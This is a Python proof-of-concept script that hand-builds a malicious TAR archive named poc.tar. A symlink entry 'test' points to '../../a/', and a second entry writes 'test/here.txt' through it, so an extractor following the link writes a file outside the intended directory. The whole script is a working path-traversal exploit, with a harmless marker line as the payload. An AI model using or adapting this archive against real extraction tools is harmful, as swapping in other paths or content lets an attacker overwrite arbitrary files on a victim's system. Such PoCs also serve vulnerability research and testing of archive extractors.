#!/usr/bin/env python3
# TAR archive
sym_filename = b'test'
symlink = b'../../a/'
filename = b'test/here.txt'
user_and_group = b'user'
user_root = b'root'
content = b'I should not be here - by segfault\n'

#
### USTAR header block 1
#
ustarheader_b1 = []
ustarheader_b1.append(sym_filename + b'\x00' * (100-len(sym_filename)))
ustarheader_b1.append(b'0000777\x00')
ustarheader_b1.append(b'0001750\x00')
ustarheader_b1.append(b'0001750\x00')
ustarheader_b1.append(b'00000000000\x00')
ustarheader_b1.append(b'14320023145\x00')
ustarheader_b1.append(b'        ')
ustarheader_b1.append(b'2')
ustarheader_b1.append(symlink + b'\x00' * (100-len(symlink)))
ustarheader_b1.append(b'ustar  \x00')
ustarheader_b1.append(user_and_group + b'\x00' * (32-len(user_and_group)))
ustarheader_b1.append(user_and_group + b'\x00' * (32-len(user_and_group)))
ustarheader_b1.append(b'\x00' * 8)
ustarheader_b1.append(b'\x00' * 8)
ustarheader_b1.append(b'\x00' * 155)
ustarheader_b1.append(b'\x00' * 12)

# calculate checksum for block 1
x=0
c=b''.join(ustarheader_b1)
for k in c:
    x+=k

ustarheader_b1[6] = b'0' + str(oct(x)[2:]).encode() + b'\x00 '

#
### USTAR header block 2
#
ustarheader_b2 = []
ustarheader_b2.append(filename + b'\x00' * (100-len(filename)))
ustarheader_b2.append(b'0000644\x00')
ustarheader_b2.append(b'0000000\x00')
ustarheader_b2.append(b'0000000\x00')
ustarheader_b2.append(oct(len(content))[2:].zfill(11).encode() + b'\x00')
ustarheader_b2.append(b'14320023145\x00')
ustarheader_b2.append(b'        ')
ustarheader_b2.append(b'0')
ustarheader_b2.append(b'\x00' * 100)
ustarheader_b2.append(b'ustar  \x00')
ustarheader_b2.append(user_root + b'\x00' * (32-len(user_root)))
ustarheader_b2.append(user_root + b'\x00' * (32-len(user_root)))
ustarheader_b2.append(b'\x00' * 8)
ustarheader_b2.append(b'\x00' * 8)
ustarheader_b2.append(b'\x00' * 155)
ustarheader_b2.append(b'\x00' * 12)

# calculate checksum for block 2
x=0
c=b''.join(ustarheader_b2)
for k in c:
    x+=k

ustarheader_b2[6] = b'0' + str(oct(x)[2:]).encode() + b'\x00 '
# write file content and fill the gaps
ustarheader_b2.append(content + b'\x00' * (512-len(content)))

ustarheader_b3_b4 = []
ustarheader_b3_b4.append(b'\x00' * 1024)

# write payload into a tar archive
payload = open('poc.tar', 'wb')
payload.write(b''.join(ustarheader_b1))
payload.write(b''.join(ustarheader_b2))
payload.write(b''.join(ustarheader_b3_b4))
payload.close()
